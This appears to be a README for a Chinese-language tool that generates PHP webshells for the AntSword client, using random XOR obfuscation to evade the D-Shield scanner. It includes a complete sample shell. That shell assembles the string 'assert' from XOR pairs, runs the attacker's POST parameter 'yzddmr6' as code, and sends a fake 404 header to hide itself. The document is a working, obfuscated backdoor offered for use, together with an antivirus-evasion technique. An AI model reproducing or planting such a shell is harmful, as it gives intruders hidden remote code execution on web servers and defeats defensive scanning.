# as_php_xor_bypass
利用随机异或无限免杀D盾蚁剑版 (thx @SardineFish & @Medicean)


原项目地址:
https://github.com/yzddmr6/webshell-venom


### 生成 Shell 样例

```
<?php 
header('HTTP/1.1 404');
class COMI { 
    public $c='';
    function __destruct() {
        $_0 = "\xfc" ^ "\x9d";
        $_1 = "\x4" ^ "\x77";
        $_2 = "\xb4" ^ "\xc7";
        $_3 = "\x9b" ^ "\xfe";
        $_4 = "\x93" ^ "\xe1";
        $_5 = "\xe7" ^ "\x93";
        $db =$_0.$_1.$_2.$_3.$_4.$_5;
        return @$db($this->c);
    }
}
$comi = new COMI();
@$comi->c = $_POST['yzddmr6'];
?>
```
